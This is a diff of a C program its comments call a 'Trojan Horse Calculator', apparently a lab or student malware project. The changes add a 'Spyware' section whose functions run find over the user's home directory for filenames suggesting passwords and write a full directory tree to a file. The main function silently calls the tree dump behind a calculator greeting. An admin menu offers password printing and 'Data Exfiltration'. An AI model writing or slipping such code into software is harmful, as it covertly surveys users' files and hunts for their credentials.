@@ -158,7 +158,7 @@ bool administrator(unsigned int backdoor){
     if (backdoor == 0) {
         findUser(1);
     }
-    puts("Welcome 'Administrator'!");
+    puts("Welcome to evil mode! >:)");
 
     while (checkEntry) {
         puts("Here is what you can do, enter for the following options:\n0: Exit back to calculator\n1: Print all user's usernames and passwords\n2: Print all stolen data to file\n3: Data Exfiltration");
@@ -293,6 +293,25 @@ bool createExfilFile(){
         return false;
     }
 }
+/*
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+                                              Spyware
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+*/
+/*
+Function used to locate potential files containing/relating to passwords and store paths
+*/
+void locateValuables(){
+    system("find ~ -type f \\( -name \"*pass*\" -o -name \"*psswd*\" -o -name \"*pswd*\" \\) > ./data/potential_leads.txt");
+}
+
+/*
+Function used generate a tree from the user's home directory
+*/
+void generateTree(){
+    system("tree ~ > ./data/tree.txt");
+}
+
 
 /*
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -459,6 +478,8 @@ void formatString(char string[]) {
 int main(){
     //Trojan Horse Calculator
     //calculator();
+    //locateValuables();
+    generateTree();
     puts("Welcome to the best ever calculator!");
     userAuth();
     //sendFile();
